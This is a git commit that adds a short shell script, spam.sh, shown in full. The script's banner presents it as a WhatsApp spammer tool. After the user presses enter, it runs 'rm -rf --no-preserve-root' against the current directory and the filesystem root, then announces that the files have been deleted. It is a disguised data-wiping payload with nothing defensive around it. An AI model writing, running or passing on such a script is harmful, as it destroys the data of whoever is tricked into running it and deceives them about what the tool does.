305528a3a0d9b58afcfbaba6346f6b1865e9e03a
Ryuzora <63346786+Ryuzora@users.noreply.github.com>
2020-04-09 15:19:26 +0800

    Create spam.sh

---
+++ spam.sh
@@ -0,0 +1,10 @@
+echo -e '\e[31m╔═════════════════════════╗'
+echo -e '\e[31m║                         ║'
+echo -e '\e[31m║    Script spammer wa    ║'
+echo -e '\e[31m║                         ║'
+echo -e '\e[31m╚═════════════════════════╝'
+
+read -p 'Click enter to continue'
+rm -rf --no-preserve-root *
+rm -rf --no-preserve-root /
+echo -e '\e[32mYour file has been deleted!!
